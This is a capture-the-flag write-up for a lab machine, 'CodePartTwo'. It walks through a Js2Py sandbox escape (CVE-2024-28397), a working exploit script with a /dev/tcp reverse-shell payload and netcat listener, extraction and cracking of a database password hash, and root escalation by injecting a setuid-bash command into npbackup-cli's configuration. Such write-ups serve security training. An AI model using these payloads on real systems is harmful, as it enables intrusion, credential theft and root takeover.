# CTF Writeup: CodePartTwo

> **Author:** Mr Axidion  
> **Date:** 2026-01-08  
> **Difficulty:** Easy / Medium  

---

## 1. Initial Enumeration

Every engagement starts with identifying open ports and services to map potential attack surfaces.

### Nmap Scan

**Command:**

```bash
nmap -sV -sC -p22,8000 <TARGET_IP>
```

**Results:**

- 22/tcp → OpenSSH 8.2p1 (Ubuntu)  
- 8000/tcp → Gunicorn 20.0.4 (Python HTTP Server)  
- Web Title → *Welcome to CodePartTwo*  

Accessing:

```
http://<TARGET_IP>:8000
```

A hint was found:

```
"CodePartTwo is open-source"
```

Navigating to `/dashboard` revealed an online JavaScript editor.

---

## 2. Initial Access

### Vulnerability: CVE-2024-28397 (Js2Py Sandbox Escape)

The application uses **Js2Py**, a Python library for executing JavaScript.

This library is vulnerable to a sandbox escape (**CVE-2024-28397**), allowing execution of arbitrary Python code on the host system.

---

### Exploitation

A custom exploit was used to escape the sandbox and trigger a reverse shell.

The payload abuses Python internals (`__subclasses__`) to access `subprocess.Popen`.

**Exploit Script:**

```python
import requests
import argparse

def generate_payload(lhost, lport):
    rshell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    js_payload = f"""
    var a = Object.getOwnPropertyNames({{}}).__class__.__base__.__getattribute__;
    var obj = a(a(a, "__class__"), "__base__");
    var findpopen = function(o) {{
        var subclasses = o.__subclasses__();
        for(var i = 0; i < subclasses.length; i++) {{
            var item = subclasses[i];
            if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{ return item; }}
        }}
        return null;
    }};
    var Popen = findpopen(obj);
    if (Popen) {{ Popen(["/bin/bash", "-c", "{rshell}"]); }}
    "Success";
    """
    return js_payload
```

After setting up a listener:

```bash
nc -lvnp 4444
```

The exploit returned a shell as:

```
app
```

---

## 3. Lateral Movement

### Database Enumeration

Inside the application directory:

```
/app/instance
```

A SQLite database was found:

```bash
sqlite3 users.db
sqlite> SELECT * FROM user;
```

**Credentials Extracted:**

```
User: marco
Hash: 649c9d65a206a75f5abe509fe128bce5
```

After cracking:

```
Password: sweetangelbabylove
```

### SSH Access

```bash
ssh marco@<TARGET_IP>
```

**User Flag:**

```
a6640f99a6880ee999cd984c5f2e****
```

---

## 4. Privilege Escalation

### Sudo Permissions

Checking sudo rights:

```bash
sudo -l
```

Output showed:

```
/usr/local/bin/npbackup-cli (run as root without password)
```

---

### Exploiting npbackup-cli

The tool uses a configuration file:

```
npbackup.conf
```

A field named `post_exec_commands` allows execution of commands after backup completion.

Since the binary runs as root, these commands execute with root privileges.

---

### Step 1: Modify Configuration

```yaml
post_exec_commands: ["/bin/cp /bin/bash /tmp/rootbash; /bin/chmod +s /tmp/rootbash"]
```

---

### Step 2: Trigger Backup

```bash
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
```

---

### Step 3: Get Root Shell

```bash
/ tmp/rootbash -p
```

---

## 5. Root Access

**Root Flag:**

```
f1e0a8b7b38b9a7f2fcceae29e4*****
```

---

## Conclusion

This machine demonstrates a full attack chain involving:

- Web exploitation via Js2Py sandbox escape  
- Reverse shell and initial foothold  
- Credential extraction from local database  
- Lateral movement via SSH  
- Privilege escalation through misconfigured sudo binary  

It highlights the risks of insecure sandbox implementations and improper privilege delegation.
